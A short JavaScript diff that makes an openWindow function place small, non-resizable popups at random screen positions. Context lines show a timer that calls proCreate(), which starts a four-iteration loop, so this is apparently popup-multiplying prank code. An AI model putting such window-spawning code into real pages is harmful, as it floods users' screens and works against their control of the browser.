@@ -39,12 +39,16 @@ function openWindow(url) {
     const width = Math.round(window.screen.width * 0.1875);
     const height = Math.round(window.screen.height * 0.2222);
 
-    const left = Math.floor((screen.width - width) / 2);
-    const top = Math.floor((screen.height - height) / 2);
+    // Random on-screen position
+    const maxLeft = Math.max(0, screen.availWidth - width);
+    const maxTop = Math.max(0, screen.availHeight - height);
+
+    const left = Math.floor(Math.random() * (maxLeft + 1));
+    const top = Math.floor(Math.random() * (maxTop + 1));
 
     const features =
         `menubar=no,status=no,toolbar=no,resizable=no,` +
-        `width=${width},height=${height},left=${left},top=${top},`;
+        `width=${width},height=${height},left=${left},top=${top}`;
 
     const aWindow = window.open(url, "_blank", features);
 
@@ -62,10 +66,9 @@ function openWindow(url) {
                 clearInterval(timer);
                 proCreate();
             }
-
         }, 40);
     }
-} 
+}
   
 function proCreate() {  
     for (let i = 0; i < 4; i++) {  
